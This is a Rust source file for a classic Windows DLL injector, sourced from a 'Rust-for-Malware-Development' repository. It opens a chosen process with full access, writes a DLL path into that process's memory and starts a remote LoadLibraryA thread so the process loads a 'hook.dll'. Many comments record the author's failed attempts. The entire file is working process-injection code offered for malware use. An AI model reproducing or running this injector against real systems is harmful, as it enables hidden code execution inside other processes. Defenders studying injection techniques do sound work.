/*
Dll Injector using Rust..
code source [smukx]:  https://github.com/Whitecat18/Rust-for-Malware-Development.git

*/

use std::env::args;
use std::ptr::null_mut;
// use winapi::shared::minwindef::LPVOID;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
// use winapi::um::minwinbase::LPTHREAD_START_ROUTINE;
use winapi::um::processthreadsapi::CreateRemoteThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use winapi::um::{processthreadsapi::OpenProcess, winnt::PROCESS_ALL_ACCESS};
use winapi::shared::ntdef::NULL;
use winapi::ctypes::c_void;
use winapi::um::winbase::INFINITE; // 0xFFFFFFFF
// use winapi::um::handleapi::HANDLE
// use winapi::um::winnt::{HANDLE,LPCSTR};

const PLU: &str = "[+]";

fn main(){
    let pid_inp = args().collect::<Vec<String>>();
    // let inp = inp[1].trim().parse::<i32>();

    if pid_inp.len() != 2{
        println!("{} Usage: dll_inject.exe <PID>",PLU);
        return;
    }

    let pid = pid_inp[1].parse::<u32>().expect("Provide Valid PID");
    println!("{} PID: {}",PLU,pid);
    
    unsafe{                                                              //hook.dll
        // let dllpath = "C:\\Users\\KAVIN STUDIO\\Desktop\\rust\\learn\\hook.dll";
        let dllpath = "H:\\malware_development\\hook\\target\\release\\hook.dll";
        // let dllpath = "hook.dll";
        let dllsize = dllpath.len();
        let process = OpenProcess(PROCESS_ALL_ACCESS, false as i32 ,pid);
        
        if process == NULL{
            println!("{} failed to get handle to the process: {}",PLU,GetLastError());
            return
        }

        println!("{} HANDLE of {} : {:?} ",PLU,pid,process);
        
        let buffer = VirtualAllocEx(
            process,
            null_mut(), 
            dllsize, 
            MEM_COMMIT|MEM_RESERVE, 
            PAGE_READWRITE, 
        );

        println!("{} Buffer Allocated to process memory with readwrite permission: {:#?}",PLU,buffer);

        if buffer == null_mut(){
            println!("{} Failed to allocate buffer: error: {}",PLU,GetLastError());
            return
        }

        WriteProcessMemory(
            process,
            buffer, 
            dllpath.as_ptr() as *const c_void, 
            dllsize, null_mut()
        );
        
        println!("{} wrote [{}] to process memory !",PLU,dllpath);
                

        // Sick work starts from here ;<( 
        // Calling kernel32.dll and LoadLibraryA


        let kernel32 = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const _);

        // let kernel32 = LoadLibraryW("Kernel32\0".as_ptr() as *const u16);

        if kernel32 == null_mut(){
            println!("{} Failed to get handle to kernel32.dll. Error: {}",PLU,GetLastError());
            CloseHandle(process);
            return
        }
        println!("{} Got a handle to kernel32.dll: {:#?}",PLU,kernel32);
        
        let kernel32_addr = GetProcAddress(kernel32,"LoadLibraryA\0".as_ptr() as *const _);

        if kernel32_addr.is_null(){
            println!("{} Failed to get address of LoadLibrary. Error: {:#?}",PLU,kernel32_addr);
            return
        }
        println!("{} LoadLibraryA Address : {:#?}",PLU,kernel32_addr);

        // This is some thing that i tried something new . got bunch of errors when i tried . will be used on reflective DLL.  


        // Calling the LoadLibrary Function !
            // Some shit i tried but not worked as i expected !
        // let load_lib: LPTHREAD_START_ROUTINE = {
        //     let lib_name = CString::new("LoadLibraryW").unwrap();
        //     let load_lib_ptr = GetProcAddress(kernel32, lib_name.as_ptr());
        //     // if load_lib_ptr == null_mut() or NULL
        //     if load_lib_ptr.is_null(){
        //         println!("{} Failed to get the address of LoadLibraryW {}",PLU,GetLastError());
        //         return
        //     }
        //     std::mem::transmute(load_lib_ptr)
        // };

        // let load_lib: unsafe extern "system" fn(LPVOID) -> HANDLE = std::mem::transmute(GetProcAddress(kernel32,b"LoadLibraryA\0".as_ptr() as LPCSTR));
        // let load_library: extern "system" fn(LPVOID) -> HANDLE = std::mem::transmute(GetProcAddress(kernel32, b"LoadLibraryA\0".as_ptr() as LPCSTR));

        // if load_lib == null_mut(){
        //     println!("{} Failed to get the address of the LoadLibraryA. Error: {}",PLU,GetLastError());
        //     return
        // }

        // type LoadLibraryFn = unsafe extern "system" fn(*mut winapi::ctypes::c_void) -> u32;
        // // type LoadLibraryFn = extern "system" fn(lp_libfilename: LPCSTR) -> HANDLE;

        // let load_library: LoadLibraryFn = {
        //     // Get the address of LoadLibraryA
        //     let load_library_addr = GetProcAddress(kernel32, b"LoadLibraryA\0".as_ptr() as LPCSTR);
        //     if load_library_addr.is_null() {
        //         println!("Failed to get the address of LoadLibraryA.");
        //         return;
        //     }
        //     std::mem::transmute(load_library_addr)
        // };

        // let load_val = load_library(buffer as LPCSTR);
        // if load_val.is_null(){
        //     println!("{} Failed to load the dll into the target process: {}",PLU,GetLastError());
        //     return
        // }
        // println!("{} Got the address of the LoadLibraryW: {:?}",PLU,load_library);

        let thread = CreateRemoteThread(
            process,
            null_mut(),
            0,
            Some(std::mem::transmute(kernel32_addr)), 
            buffer,
            0,
            null_mut(),
        );

        if thread.is_null(){
            println!("{} Failed to get handle to the thread: {}",PLU,GetLastError());
            return
        }

        WaitForSingleObject(thread, INFINITE);

        println!("{} Finish Executing thread...",PLU);
        CloseHandle(thread);
        CloseHandle(process);
        
        println!("{} DLL INJECTION EXECUTED SUCCESSFULLY :D",PLU);
        return
    }
}


